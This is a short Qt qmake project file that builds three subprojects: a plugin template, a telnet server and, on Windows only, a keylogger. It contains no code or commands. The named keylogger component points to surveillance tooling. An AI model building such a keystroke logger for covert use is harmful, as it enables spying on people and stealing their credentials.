TEMPLATE = subdirs
CONFIG  += ordered

SUBDIRS += PluginTemplate
SUBDIRS += TelnetSvr

win32 {
SUBDIRS += WindowsKeyLogger
}
